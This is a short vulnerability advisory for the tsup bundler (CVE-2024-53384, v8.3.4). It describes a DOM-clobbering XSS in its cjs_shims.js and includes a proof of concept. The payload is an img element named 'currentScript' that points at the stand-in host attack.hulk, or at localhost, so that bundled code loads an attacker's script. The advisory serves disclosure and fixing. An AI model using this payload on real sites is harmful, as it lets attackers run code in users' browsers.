## tsup

### Meta

+ Library: tsup
+ Stars: 8.9K
+ Payload: ```<img src="https://attack.hulk" name="currentScript">```
+ Impact: XSS
+ CVE: CVE-2024-53384
+ Version: v8.3.4
+ Status: Reported
+ Security Policy: Requested
+ Foundby: TheHulk

### Library

https://github.com/egoist/tsup

### Vulnerable Code Snippet

```javascript
// node_modules/tsup/assets/cjs_shims.js
var getImportMetaUrl = () => typeof document === "undefined" ? new URL(`file:${__filename}`).href : document.currentScript && document.currentScript.src || new URL("main.js", document.baseURI).href;
var importMetaUrl = /* @__PURE__ */ getImportMetaUrl();
```

## PoC

as an example, bundle the js below.

```javascript
var s = document.createElement('script')
s.src = import.meta.url + 'extra.js'
document.head.append(s)
```

example html:

<!-- ```html
<img name="currentScript" src="//attack.hulk"></img>
<script src="dist/index.js"></script>
``` -->

```html
<!--Library-->
<script src="dist/index.js"></script>
<!--Library-->

<!--Payload-->
<img name="currentScript" src="//localhost:9999">
<!--Payload-->
```

